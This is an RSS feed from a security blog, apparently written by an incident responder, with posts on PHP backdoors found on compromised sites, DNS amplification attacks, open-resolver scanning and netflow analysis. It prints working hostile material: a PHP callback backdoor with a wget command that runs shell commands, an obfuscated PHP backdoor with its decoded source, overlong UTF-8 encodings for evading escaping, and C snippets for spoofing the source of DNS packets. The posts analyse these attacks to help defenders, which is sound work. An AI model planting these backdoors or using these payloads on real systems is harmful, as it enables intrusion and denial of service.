<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Security on Greyhat.dk</title>
    <link>https://www.greyhat.dk/categories/security/</link>
    <description>Recent content in Security on Greyhat.dk</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Sat, 10 May 2014 00:00:00 +0000</lastBuildDate>
    <atom:link href="https://www.greyhat.dk/categories/security/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>PHP callback function backdoor</title>
      <link>https://www.greyhat.dk/php-callback-function-backdoor/</link>
      <pubDate>Sat, 10 May 2014 00:00:00 +0000</pubDate>
      
      <guid>https://www.greyhat.dk/php-callback-function-backdoor/</guid>
      <description>&lt;p&gt;I recently had an incident at a customers website where the site was
compromised. The customer went through the code and found several SQL
injections, XSS and newly added files with backdoors (basic evals in
PHP). All vulnerabilities was fixed (According to the customer) but
about a month later the site was compromised again. Unfortunately no
version control was used so we had to go through all files to help the
customer and the log had no indications of successful attempts.&lt;/p&gt;

&lt;p&gt;In several files I found code like this&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;    @array_diff_ukey(@array((string)$_REQUEST[&#39;list&#39;]=&amp;gt;1), @array((string)stripslashes($_REQUEST[&#39;list2&#39;])=&amp;gt;2),$_REQUEST[&#39;var&#39;]);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It took me a while to fully understand what this is. This is a quite
clever backdoor and the reason why its was not detected in apaches log
is that POST was used to execute the command for compromising.&lt;/p&gt;

&lt;p&gt;So in order to execute a command on the system all the attacker had to
  do was&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;    $ wget -S -O - --post-data &#39;var=system&amp;amp;list=ls&#39; http://example.com/g.php --2014-05-10 14:23:45-- http://example.com/g.php Resolving example.com... 127.0.0.1 Connecting to example.com|127.0.0.1|:80... connected. HTTP request sent, awaiting response... HTTP/1.1 200 OK Date: Sat, 10 May 2014 12:23:45 GMT Server: Apache Connection: close Content-Type: text/html Length: unspecified [text/html] Saving to: &#39;STDOUT&#39; 
    [&amp;lt;=&amp;gt; ] 0 --.-K/s
    cv.pdf
    g.php
    index.html
    index5.html
    [ &amp;lt;=&amp;gt; ] 79 --.-K/s in 0s
    2014-05-10 14:23:45 (428 KB/s) - written to stdout [79]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nice directory listing :) I&amp;rsquo;m pretty sure you can find alternative ways
to use this then listing files. But since the customer did not find this
backdoor using a review it really proves a few things.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Always use version control on your software (Subversion, Git etc)&lt;/li&gt;
&lt;li&gt;Always sanitize input&lt;/li&gt;
&lt;li&gt;Hire developers who knows the current languages pitfalls, know how to
review code.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Another thing I found was a heavy usage of the php function
mysql_real_escape_string. The function does not provide any real
security since it does not handle overlong UTF-8 chars.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;    &#39; = %27 = %c0%a7 = %e0%80%a7 = %f0%80%80%a7 
    &amp;quot; = %22 = %c0%a2 = %e0%80%a2 = %f0%80%80%a2 
    &amp;lt; = %3c = %c0%bc = %e0%80%bc = %f0%80%80%bc
    ; = %3b = %c0%bb = %e0%80%bb = %f0%80%80%bb 
    &amp;amp; = %26 = %c0%a6 = %e0%80%a6 = %f0%80%80%a6 
    \0= % 00 = %c0%80 = %e0%80%80 = %f0%80%80%80
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Â &lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>DNS amplification by example</title>
      <link>https://www.greyhat.dk/dns-amplification-by-example/</link>
      <pubDate>Mon, 22 Apr 2013 00:00:00 +0000</pubDate>
      
      <guid>https://www.greyhat.dk/dns-amplification-by-example/</guid>
      <description>

&lt;h1 id=&#34;how-it-works:f4145162e1daaabbe3a28d9188ad62da&#34;&gt;How it works&lt;/h1&gt;

&lt;p&gt;DNS amplification is very easy to make and quite effective. An attacker
finds a DNS resolver that is public, creates a spoofed UDP DNS request
originating from the targets address sending the DNS response to the
target. The trick in this attack is to create a bigger output then input
(hence the amplification). What better way than to request a list of
authority records for a top level like .com&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;    # dig soa com @localhost

    ; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.7.3 &amp;lt;&amp;lt;&amp;gt;&amp;gt; soa com @localhost
    ;; global options: +cmd
    ;; Got answer:
    ;; -&amp;gt;&amp;gt;HEADER&amp;lt;&amp;lt;- opcode: QUERY, status: NOERROR, id: 60774
    ;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 13, ADDITIONAL: 0

    ;; QUESTION SECTION:
    ;com.               IN  SOA

    ;; ANSWER SECTION:
    com.            837 IN  SOA a.gtld-servers.net. nstld.verisign-grs.com. 1366568135 1800 900 604800 86400

    ;; AUTHORITY SECTION:
    com.            92359   IN  NS  b.gtld-servers.net.
    com.            92359   IN  NS  m.gtld-servers.net.
    com.            92359   IN  NS  l.gtld-servers.net.
    com.            92359   IN  NS  f.gtld-servers.net.
    com.            92359   IN  NS  c.gtld-servers.net.
    com.            92359   IN  NS  d.gtld-servers.net.
    com.            92359   IN  NS  g.gtld-servers.net.
    com.            92359   IN  NS  e.gtld-servers.net.
    com.            92359   IN  NS  k.gtld-servers.net.
    com.            92359   IN  NS  h.gtld-servers.net.
    com.            92359   IN  NS  j.gtld-servers.net.
    com.            92359   IN  NS  a.gtld-servers.net.
    com.            92359   IN  NS  i.gtld-servers.net.

    ;; Query time: 23 msec
    ;; SERVER: ::1#53(::1)
    ;; WHEN: Sun Apr 21 20:17:01 2013
    ;; MSG SIZE  rcvd: 300
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Looking at this using tcpdump it gets quite clear that the request is
quite smaller than the response&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;    20:17:01.146195 IP6 (hlim 64, next-header UDP (17) payload length: 29) ::1.43296 &amp;gt; ::1.53: [udp sum ok] 60774+ SOA? com. (21)
    20:17:01.168318 IP6 (hlim 64, next-header UDP (17) payload length: 308) ::1.53 &amp;gt; ::1.43296: [udp sum ok] 60774 q: SOA? com. 1/13/0 com. SOA a.gtld-servers.net. nstld.verisign-grs.com. 1366568135 1800 900 604800 86400 ns: com. NS b.gtld-servers.net., com. NS m.gtld-servers.net., com. NS l.gtld-servers.net., com. NS f.gtld-servers.net., com. NS c.gtld-servers.net., com. NS d.gtld-servers.net., com. NS g.gtld-servers.net., com. NS e.gtld-servers.net., com. NS k.gtld-servers.net., com. NS h.gtld-servers.net., com. NS j.gtld-servers.net., com. NS a.gtld-servers.net., com. NS i.gtld-servers.net. (300)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The request in this case is 21 bytes and the response is 300 bytes (That
is almost 15 times bigger) and this is without DNSSEC (DNSSEC has a much
bigger response). All these requests will of course be dropped by the
target machine but making enough of these will simply flood the
bandwidth of the server/router (Or even ISP) with very little effort.&lt;/p&gt;

&lt;h1 id=&#34;behind-the-scene:f4145162e1daaabbe3a28d9188ad62da&#34;&gt;Behind the scene&lt;/h1&gt;

&lt;p&gt;Now there is plenty of tools out for spoofing packages or one could
simply rent a botnet. But I&amp;rsquo;m a strong believer in knowing how is the
key to prevent it so lets examine how to create a spoofed UDP DNS
request using gcc and Linux.&lt;/p&gt;

&lt;p&gt;The systemcall sendto(2) is used for sending data but when combined with
raw sockets you get to customise the OSI layers (&lt;a href=&#34;http://en.wikipedia.org/wiki/IPv4_header#Header&#34; title=&#34;IP header&amp;quot; and [UDP header](http://en.wikipedia.org/wiki/User_Datagram_Protocol &amp;quot;UDP header&#34;&gt;IP header&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;I have provided an example on how to create a spoofed DNS request but
the interesting parts are really&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;            packet.ip.ip_dst.s_addr = inet_addr(&amp;quot;192.168.1.1&amp;quot;);
            packet.ip.ip_src.s_addr = inet_addr(&amp;quot;192.168.1.7&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;and&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;            remote_addr.sin_addr.s_addr = packet.ip.ip_dst.s_addr;
            remote_addr.sin_port = packet.udp.uh_dport;
            remote_addr.sin_family = AF_INET;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The rest is just basic networking code using C.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://greyhat.dk/toolbox/dns_amplification.c&#34; title=&#34;Example of DNS amplification&#34;&gt;dns_amplification.c&lt;/a&gt;
only demonstrates how its done and is not suitable for a realworld
effective DOS. Buffering request like &amp;ldquo;the low bit ion cannon&amp;rdquo; and using
several toplevel soa request (.com, .eu, .edu etc) and adding lots of
DNS servers would make it effective.&lt;/p&gt;

&lt;h1 id=&#34;how-to-defend-against-this-attack:f4145162e1daaabbe3a28d9188ad62da&#34;&gt;How to defend against this attack&lt;/h1&gt;

&lt;p&gt;Since this is a bandwidth attack its a matter of having enough bandwidth
and being able to reject it. It might sound easy but its quite common to
see attacks using more than 1Gbit/s and this is where your standard
firewall most likely is already flooded and can no longer process data.
This is where the ISP comes in and can help prevent the attack by
blocking the attack in the core network.&lt;/p&gt;

&lt;p&gt;Now &lt;a href=&#34;http://openresolverproject.org/&#34; title=&#34;Openresolver project&#34;&gt;openresolverproject.org&lt;/a&gt;
uncovered a lot of open DNS resolvers (Roughly counted more than
20.000+) and if the attacker was using all these (And a botnet) and
assuming they all have a 1Gbit/s connection you could create a
19.5TBit/s attack!. We have already seen a 300Gbit/s attack on spamhaus
causing a major slowdown on the internet. But a 19.5TB attack would take
down large parts of the internet so of course no ISP can prevent this.&lt;/p&gt;

&lt;h1 id=&#34;why-is-this-attack-even-possible:f4145162e1daaabbe3a28d9188ad62da&#34;&gt;Why is this attack even possible&lt;/h1&gt;

&lt;p&gt;Several parties besides the attacker come to mind here.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Software vendors for not making a better default configuration making
it a open resolver per default&lt;/li&gt;
&lt;li&gt;End users who install software not knowing how to prober configure
the software&lt;/li&gt;
&lt;li&gt;ISPs for not blocking spoofed traffic from their network (They should
block outbound traffic that does not originate from the network)&lt;/li&gt;
&lt;li&gt;ISPs for not telling the end user about this security issue and not
acting on it (Blocking ports)&lt;/li&gt;
&lt;li&gt;ISPs for not responding to abuse complaints&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;As it is now things will never get fixed. Spamhaus created a lookup
database for open dns resolvers (So ISP could block for these
misconfigred servers) but since the ISP properly would loose customers
due to blocking they will never use it (And they would have to use
excessive CPU on the border routers to handle it). And since there is no
law to actually get abuse complaints enforced the ISP will not take
responsibility. So it all comes down to money in the end.&lt;/p&gt;

&lt;p&gt;The way I would like it to work is to simply&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Create a abuse report to the ISP and CC ripe (or a taskforce for
handling abuse world wide) for every abuse case&lt;/li&gt;
&lt;li&gt;The task force should register the amount of abuse based on allocated
subnet&lt;/li&gt;
&lt;li&gt;Fail to handle abuse enough times and the task force should simply
remove the subnet allocation removing the network from the ISP&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This will make the ISP care about security since loosing IP&amp;rsquo;s will force
their customers offline. And ISPs known to host spammers would simply be
shutdown by loosing all their IPs.&lt;/p&gt;

&lt;p&gt;The last DNS amplification I handled I created a script for creating
abuse reports. Just to take the top 2 abuse accounts from the list of
open resolvers&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;        189 abuse@oneandone.net
       1503 abuse@ovh.net
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So 1503 servers with open resolvers from one single ISP .. Created a
abuse report on this within 12 hours of the incident (More than 10 days
ago) and all of these servers are still online and I never heard a
single word (Weird enough this seems to be the standard not to reply).&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Scanning for recursive DNS servers</title>
      <link>https://www.greyhat.dk/scanning-for-recursive-dns-servers/</link>
      <pubDate>Thu, 11 Apr 2013 00:00:00 +0000</pubDate>
      
      <guid>https://www.greyhat.dk/scanning-for-recursive-dns-servers/</guid>
      <description>&lt;p&gt;When working for an ISP it becomes pretty clear that you don&amp;rsquo;t want your
customers or your network to participate in any attack. I wrote a small
perl script to find DNS servers open for recursive requests&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://greyhat.dk/toolbox/scandns.pl&#34; title=&#34;Perl script for scanning for vulnerable DNS servers&#34;&gt;scandns.pl&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I found 19 misconfigured DNS servers. Now the real work starts by
contacting the owners.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Lancope stealthwatch</title>
      <link>https://www.greyhat.dk/lancope-stealthwatch/</link>
      <pubDate>Thu, 28 Feb 2013 00:00:00 +0000</pubDate>
      
      <guid>https://www.greyhat.dk/lancope-stealthwatch/</guid>
      <description>&lt;p&gt;Had a nice meeting yesterday with Cisco and some guys from Lanecope.
Must say that stealthwatch seems like a really great product. What their
product does is that is collects all flows (and more). Sums it up so you
can drill down via connections.&lt;/p&gt;

&lt;p&gt;Basically it does something like this on your netflow data&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;    ~$ nfdump -R /var/cache/nfdump/data/asr0/nfcapd.201302281130:asr1/nfcapd.201302281133 -o long  &#39;dst host 77.66.32.1&#39;|head -10
    Date flow start          Duration Proto      Src IP Addr:Port          Dst IP Addr:Port   Flags Tos  Packets    Bytes Flows
    2013-02-28 11:29:58.616     0.000 TCP      198.89.107.36:41257 -&amp;gt;      77.66.32.1:80    ....S.   0        8      384     1
    2013-02-28 11:29:58.612     0.000 TCP       181.3.74.102:23628 -&amp;gt;      77.66.32.1:80    ....S.   0        8      384     1
    2013-02-28 11:29:58.612     0.000 TCP      122.149.174.9:25733 -&amp;gt;      77.66.32.1:80    ....S.   0        8      384     1
    2013-02-28 11:29:58.612     0.000 TCP     175.217.179.22:27301 -&amp;gt;      77.66.32.1:80    ....S.   0        8      384     1
    2013-02-28 11:29:58.613     0.000 TCP     141.149.190.34:56307 -&amp;gt;      77.66.32.1:80    ....S.   0        8      384     1
    2013-02-28 11:29:58.613     0.000 TCP       70.248.23.39:10543 -&amp;gt;      77.66.32.1:80    ....S.   0        8      384     1
    2013-02-28 11:29:58.613     0.000 TCP      96.45.178.104:62559 -&amp;gt;      77.66.32.1:80    ....S.   0        8      384     1
    2013-02-28 11:29:58.613     0.000 TCP      218.92.100.34:56154 -&amp;gt;      77.66.32.1:80    ....S.   0        8      384     1
    2013-02-28 11:29:58.613     0.000 TCP      59.37.156.114:34888 -&amp;gt;      77.66.32.1:80    ....S.   0        8      384     1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Stores it in a database for billing, security audits but also for
network analysis. The network analysis is based on policies and known
patterns (Beacons, traffic patterns/ports/flags, roundtrip etc). Then
lets you drill down on a specific hostgroup or target to see who, when
and that it talked to. It also integres ICE and logs from DHCP.&lt;/p&gt;

&lt;p&gt;Based on this is can alert you if your are under DDOS or if someone just
just stole your files (Requires some configuration) or if some of your
hosts is part of a botnet. Really nice but properly also quite
expensive.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>PHP backdoor</title>
      <link>https://www.greyhat.dk/php-backdoor/</link>
      <pubDate>Sat, 23 Feb 2013 00:00:00 +0000</pubDate>
      
      <guid>https://www.greyhat.dk/php-backdoor/</guid>
      <description>&lt;p&gt;Found this little thing on FB tonight.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;    &amp;lt;?php eval(gzinflate(base64_decode(&amp;quot;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&amp;quot;))); ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After unrolling the endless loops it turns out to be&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;    &amp;lt;? @error_reporting(0); @ini_set(&amp;quot;display_errors&amp;quot;,0); @ini_set(&amp;quot;log_errors&amp;quot;,0); @ini_set(&amp;quot;error_log&amp;quot;,0); if (isset($_GET[&#39;r&#39;])) { print $_GET[&#39;r&#39;]; } elseif (isset($_POST[&#39;e&#39;])) { print(base64_decode(str_rot13(strrev(base64_decode(str_rot13($_POST[&#39;e&#39;])))))); } elseif (isset($_SERVER[&#39;HTTP_CONTENT_ENCODING&#39;]) &amp;amp;&amp;amp; $_SERVER[&#39;HTTP_CONTENT_ENCODING&#39;] == &#39;binary&#39;) { $data = file_get_contents(&#39;php://input&#39;); if (strlen($data) &amp;gt; 0) print &#39;STATUS-IMPORT-OK&#39;; if (strlen($data) &amp;gt; 12) { $fp=@fopen(&#39;tmpfile&#39;,&#39;a&#39;); @flock($fp, LOCK_EX); @fputs($fp, $_SERVER[&#39;REMOTE_ADDR&#39;].&amp;quot;\t&amp;quot;.base64_encode($data).&amp;quot;\r\n&amp;quot;); @flock($fp, LOCK_UN); @fclose($fp); } } exit;?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;a backdoor&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>